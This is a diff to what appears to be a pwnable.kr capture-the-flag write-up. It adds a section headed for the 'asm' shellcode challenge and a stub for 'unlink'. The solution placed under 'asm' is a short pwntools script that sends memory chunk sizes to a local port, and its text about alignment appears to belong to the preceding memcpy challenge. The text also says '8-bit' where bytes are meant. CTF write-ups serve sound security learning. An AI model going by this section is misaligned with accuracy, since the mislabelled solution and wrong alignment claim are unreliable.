@@ -1340,3 +1340,39 @@ http://pwnable.kr/bin/memcpy.c
 
 ssh memcpy@pwnable.kr -p2222 (pw:guest)
 ```
+
+## 0x13 asm
+```
+Mommy! I think I know how to make shellcodes
+
+ssh asm@pwnable.kr -p2222 (pw: guest)
+```
+Basically the ASM operation need 16 byte alignment whereas 32-bit guarantees only 8-bit alignment by default, so we need to send proper chunk sizes for copying.
+```
+from pwn import *
+import sys
+
+r = remote("localhost", 9022)
+r.sendline("8")
+r.sendline("16")
+r.sendline("32")
+r.sendline("72")
+r.sendline("136")
+r.sendline("268")
+r.sendline("600")
+r.sendline("1208")
+r.sendline("2408")
+r.sendline("4808")
+print r.recvall()
+```
+```
+thanks for helping my experiment!
+flag : ----- erased in this source code -----
+```
+
+## 0x14 unlink
+```
+Daddy! how can I exploit unlink corruption?
+
+ssh unlink@pwnable.kr -p2222 (pw: guest)
+```
